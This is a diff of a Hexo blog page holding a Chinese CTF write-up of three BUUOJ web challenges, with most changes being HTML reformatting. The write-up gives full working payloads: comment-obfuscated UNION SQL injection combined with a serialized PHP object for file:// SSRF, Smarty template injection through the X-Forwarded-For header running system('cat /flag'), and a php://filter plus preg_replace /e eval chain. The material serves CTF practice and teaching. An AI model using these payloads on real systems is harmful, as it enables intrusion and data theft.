@@ -78,7 +78,8 @@
     
   </style>
   
-<meta name="generator" content="Hexo 6.3.0"></head>
+<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="Err0r233" type="application/atom+xml">
+</head>
 
 
 
@@ -177,7 +178,7 @@
                     <i class="fa fa-edit"></i> 
                     
                     
-                        ~5.86K
+                        ~5.79K
                     
                     字
                 </li>
@@ -202,146 +203,112 @@
             <hr />
             <div itemprop="articleBody"><p>做做buuoj上的web题，本萌新纯采集，轻喷（（（</p>
 <span id="more"></span>
-
-<h2><span id="网鼎杯-2018-fakebook">[网鼎杯 2018] Fakebook</span></h2><p>SQL注入兼反序列化</p>
+<h2><span id="网鼎杯-2018-fakebook"> [网鼎杯 2018] Fakebook</span></h2>
+<p>SQL注入兼反序列化</p>
 <p>点开靶机，一眼醒目的login和join，尝试login，那肯定是失败的</p>
 <p>所以我们试试注册，填好个人信息之后点击提交，但是提示Blog is not valid.</p>
 <img src="/2022/12/09/Buuoj%E9%A2%98%E7%9B%AE-1/1.png" class title="失败">
-
 <p>所以应该是博客地址的问题，应该是要一个确切的博客地址</p>
 <p>所以这里把博客的地址都填上（只用填github.io的就可以了）</p>
 <img src="/2022/12/09/Buuoj%E9%A2%98%E7%9B%AE-1/2.png" class title="成功">
-
-<p>然后观察url发现no&#x3D;1</p>
+<p>然后观察url发现no=1</p>
 <img src="/2022/12/09/Buuoj%E9%A2%98%E7%9B%AE-1/3.png" class title="发现no">
-
-<p>于是尝试no&#x3D;1’</p>
+<p>于是尝试no=1’</p>
 <p>发现SQL报错了</p>
 <img src="/2022/12/09/Buuoj%E9%A2%98%E7%9B%AE-1/4.png" class title="发现SQL注入">
-
 <p>于是进行SQL注入</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">no=-1&#x27;union select 1,2,3,4#</span><br></pre></td></tr></table></figure>
-
-<p>回显 no hack <del>_</del>，说明过滤了关键词</p>
+<p>回显 no hack <sub>_</sub>，说明过滤了关键词</p>
 <img src="/2022/12/09/Buuoj%E9%A2%98%E7%9B%AE-1/5.png" class title="waf">
-
 <p>接下来就是测试关键词的时候</p>
 <p>发现union 无no hack回显 union select 有no hack 回显</p>
 <p>应该是过滤了空格</p>
 <p>所以使用</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">no=-1&#x27;union/**/select/**/1,2,3,4#</span><br></pre></td></tr></table></figure>
-
 <p>发现报错，去掉单引号</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">no=-1/**/union/**/select/**/1,2,3,4#</span><br></pre></td></tr></table></figure>
-
 <img src="/2022/12/09/Buuoj%E9%A2%98%E7%9B%AE-1/6.png" class title="2号位回显正常">
-
 <p>发现2号位回显正常</p>
 <p>然后上方有个notice: unserialize()</p>
 <p>说明有反序列化的存在</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">no=-1/**/union/**/select/**/1,database(),3,4#</span><br></pre></td></tr></table></figure>
-
 <p>爆出库名 <strong>fakebook</strong></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">no=-1/**/union/**/select/**/1,group_concat(table_name),3,4/**/from/**/information_schema.tables/**/where/**/table_schema=database()#</span><br></pre></td></tr></table></figure>
-
 <p>爆出表名 <strong>users</strong></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">no=-1/**/union/**/select/**/1,group_concat(column_name),3,4/**/from/**/information_schema.columns/**/where/**/table_name=&#x27;users&#x27;#</span><br></pre></td></tr></table></figure>
-
 <p>爆出列名 <strong>no username passwd data</strong></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">no=-1/**/union/**/select/**/1,group_concat(data),3,4/**/from/**/users#</span><br></pre></td></tr></table></figure>
-
 <p>发现了一串序列化的结果</p>
 <img src="/2022/12/09/Buuoj%E9%A2%98%E7%9B%AE-1/7.png" class title="serializeResult">
-
 <p>然后似乎就做不下去了。。。</p>
 <p>应该还有一些隐藏的文件吧，打开F12也没有提示</p>
 <p>所以应该是存在敏感文件</p>
-<p>打开dirsearch扫一下…. 不过由于buuoj有反爬这个特性在，所以很难受的就是需要加上delay，使得扫描的过程十分的慢……</p>
-<p>推荐盲试 robots.txt <a target="_blank" rel="noopener" href="http://www.zip/">www.zip</a> .bak啥的</p>
+<p>打开dirsearch扫一下… 不过由于buuoj有反爬这个特性在，所以很难受的就是需要加上delay，使得扫描的过程十分的慢…</p>
+<p>推荐盲试 robots.txt www.zip .bak啥的</p>
 <p>在robots.txt发现：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: /user.php.bak</span><br></pre></td></tr></table></figure>
-
-<p>直接访问&#x2F;user.php.bak获得源码</p>
+<p>直接访问/user.php.bak获得源码</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$blog</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$age</span>, <span class="variable">$blog</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;age = (<span class="keyword">int</span>)<span class="variable">$age</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;blog = <span class="variable">$blog</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"><span class="variable">$url</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();<span class="comment">//curl_exec ssrf漏洞，请求协议</span></span><br><span class="line">        <span class="comment">//使用ssrf的file:///协议</span></span><br><span class="line"></span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        <span class="variable">$output</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="variable">$httpCode</span> = <span class="title function_ invoke__">curl_getinfo</span>(<span class="variable">$ch</span>, CURLINFO_HTTP_CODE);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$httpCode</span> == <span class="number">404</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">404</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$output</span>;<span class="comment">//返回内容</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getBlogContents</span> (<span class="params"></span>)//获取博客内容</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="variable">$this</span>-&gt;blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isValidBlog</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$blog</span> = <span class="variable language_">$this</span>-&gt;blog;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;</span>, <span class="variable">$blog</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
 <p>所以我们只需要序列化用file协议写出的flag位置，读入后使用curl就能够返回flag的内容了</p>
 <p>flag应该在根目录，那么序列化如下：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span> = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$blog</span> = <span class="string">&quot;file:///var/www/html/flag.php&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">UserInfo</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>)</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:0:&quot;&quot;;s:3:&quot;age&quot;;i:1;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;</span></span><br></pre></td></tr></table></figure>
-
 <p>所以使用sql的语句写入内容：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">no=-1/**/union/**/select/**/1,&#x27;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:0:&quot;&quot;;s:3:&quot;age&quot;;i:1;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;&#x27;,3,4#</span><br></pre></td></tr></table></figure>
-
 <p>如果没有内容，打开F12试试，如果也没有的话就换位置</p>
 <p>测试3、4号位：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">no=-1/**/union/**/select/**/1,2,&#x27;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:0:&quot;&quot;;s:3:&quot;age&quot;;i:1;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;&#x27;,4#</span><br></pre></td></tr></table></figure>
-
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">no=-1/**/union/**/select/**/1,2,3,&#x27;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:0:&quot;&quot;;s:3:&quot;age&quot;;i:1;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;&#x27;#</span><br></pre></td></tr></table></figure>
-
 <p>发现4号位回显正常，打开F12即可获取flag</p>
 <img src="/2022/12/09/Buuoj%E9%A2%98%E7%9B%AE-1/8.png" class title="获得flag">
-
-<h2><span id="bjdctf2020-the-mystery-of-ip">[BJDCTF2020] The mystery of ip</span></h2><p>smarty 模板注入</p>
+<h2><span id="bjdctf2020-the-mystery-of-ip"> [BJDCTF2020] The mystery of ip</span></h2>
+<p>smarty 模板注入</p>
 <p>打开靶机</p>
 <p>点击Flag，发现显示的是你的IP</p>
 <img src="/2022/12/09/Buuoj%E9%A2%98%E7%9B%AE-1/9.png" class title="显示IP">
-
 <p>点击Hint，发现提示：</p>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- Do you know why i know your ip? --&gt;</span></span><br></pre></td></tr></table></figure>
-
 <p>修改ip的话，应该是X-Forward-For的问题，所以我们使用burp抓包进行测试</p>
 <p>修改X-Forward-For为127.0.0.1，显示为127.0.0.1</p>
 <img src="/2022/12/09/Buuoj%E9%A2%98%E7%9B%AE-1/10.png" class title="修改xff">
-
 <p>试试修改为{7*7}，发现显示为49</p>
 <p>应该就是ssti模板注入了，然后祭出经典老图</p>
 <img src="/2022/12/09/Buuoj%E9%A2%98%E7%9B%AE-1/11.png" class title="注入模板">
-
 <p>其实也可以通过</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;config&#125;</span><br></pre></td></tr></table></figure>
-
 <p>查看哪个模板</p>
 <img src="/2022/12/09/Buuoj%E9%A2%98%E7%9B%AE-1/12.png" class title="smarty">
-
 <p>所以是smarty的ssti注入</p>
 <p>smarty的模板注入直接使用系统命令即可：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">可以使用</span><br><span class="line">&#123;<span class="keyword">if</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat /flag&#x27;</span>)&#125;&#123;/<span class="keyword">if</span>&#125;</span><br><span class="line">也可以直接使用</span><br><span class="line">&#123;<span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat /flag&#x27;</span>)&#125;</span><br></pre></td></tr></table></figure>
-
 <img src="/2022/12/09/Buuoj%E9%A2%98%E7%9B%AE-1/13.png" class title="获得flag">
-
 <p>获得flag</p>
-<h2><span id="bjdctf2020zjctf不过如此">[BJDCTF2020]ZJCTF，不过如此</span></h2><p>[ZJCTF2019]NiZhuanSiWei的复刻了属于是（雾）</p>
+<h2><span id="bjdctf2020zjctf不过如此"> [BJDCTF2020]ZJCTF，不过如此</span></h2>
+<p>[ZJCTF2019]NiZhuanSiWei的复刻了属于是（雾）</p>
 <p>直接看代码：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$text</span> = <span class="variable">$_GET</span>[<span class="string">&quot;text&quot;</span>];</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$text</span>)&amp;&amp;(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;I have a dream&quot;</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>).<span class="string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/&quot;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Not now!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);  <span class="comment">//next.php</span></span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
 <p>同样的写入，文件包含以及一个next.php</p>
-<p>那我们直接data协议写入，php:&#x2F;&#x2F;filter文件包含即可</p>
+<p>那我们直接data协议写入，php://filter文件包含即可</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?text=data:<span class="comment">//text/plain,I have a dream&amp;file=php://filter/convert.base64-encode/resource=next.php</span></span><br></pre></td></tr></table></figure>
-
 <p>获得next.php内的base64代码，进行一个decode</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;id&#x27;</span>] = <span class="variable">$id</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">complex</span>(<span class="params"><span class="variable">$re</span>, <span class="variable">$str</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(</span><br><span class="line">        <span class="string">&#x27;/(&#x27;</span> . <span class="variable">$re</span> . <span class="string">&#x27;)/ei&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>,</span><br><span class="line">        <span class="variable">$str</span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$re</span> =&gt; <span class="variable">$str</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">complex</span>(<span class="variable">$re</span>, <span class="variable">$str</span>). <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	@<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
 <p>经典再现：</p>
 <p>指路Day 4: Baby match（每日一题）</p>
-<p><font color="orange">preg_replace &#x2F;e能够执行strolower(“\\1”)的内容</font></p>
-<p>preg_replace输入的第一个是正则表达式$re，然后将$str的值替换进<font color="blue">strtolower(“\\1”)</font></p>
+<p><font color="orange">preg_replace /e能够执行strolower(“\\1”)的内容</font></p>
+<p>preg_replace输入的第一个是正则表达式<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>r</mi><mi>e</mi><mtext>，然后将</mtext></mrow><annotation encoding="application/x-tex">re，然后将</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">e</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">然</span><span class="mord cjk_fallback">后</span><span class="mord cjk_fallback">将</span></span></span></span>str的值替换进<font color="blue">strtolower(“\\1”)</font></p>
 <p>也就相当于是</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>)</span><br></pre></td></tr></table></figure>
-
 <p>也就是说我们需要传入一个正则表达式，以及一个需要执行的命令，这个正则表达式能够匹配所有的字符</p>
 <p>正则表达式：<font color="red">.*</font>又称为贪婪模式，可以匹配到所有的字符</p>
 <p>但是url中不能够使用 <strong>.</strong>  会被php读取成下划线</p>
 <p>所以我们可以使用另外一个正则表达式：<font color="red">\S*</font></p>
 <p>这个正则表达式可以匹配任何非空字符，等价于：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[^ \f\n\r\t\v]</span><br></pre></td></tr></table></figure>
-
 <p>然后我们传入的命令需要调用getFlag函数，执行eval函数：</p>
 <p>所以写成${getFlag()}，而eval函数直接执行get传参cmd传入的命令</p>
-<p>所以cmd&#x3D;system(‘cat &#x2F;flag’);</p>
+<p>所以cmd=system(‘cat /flag’);</p>
 <p>但是由于这段代码是在next.php内的，所以我们需要进入next.php并且执行命令</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload:</span><br><span class="line">url/next.php?\S*=$&#123;<span class="title function_ invoke__">getflag</span>()&#125;&amp;cmd=<span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat /flag&#x27;</span>);</span><br></pre></td></tr></table></figure>
-
 <img src="/2022/12/09/Buuoj%E9%A2%98%E7%9B%AE-1/14.png" class title="获得flag">
-
 <hr>
 <p>未完待续捏</p>
 <hr>
@@ -546,7 +513,7 @@
     <div class="photo-background"></div>
     <div class="photo-wrapper clearfix">
         <div class="photo-wrapper-tip text-center">
-            <img class="about-photo" src="/images/luo.webp" loading="lazy" decoding="auto" />
+            <img class="about-photo" src="/images/Oscar.jpg" loading="lazy" decoding="auto" />
         </div>
     </div>
     <div class="textwidget">
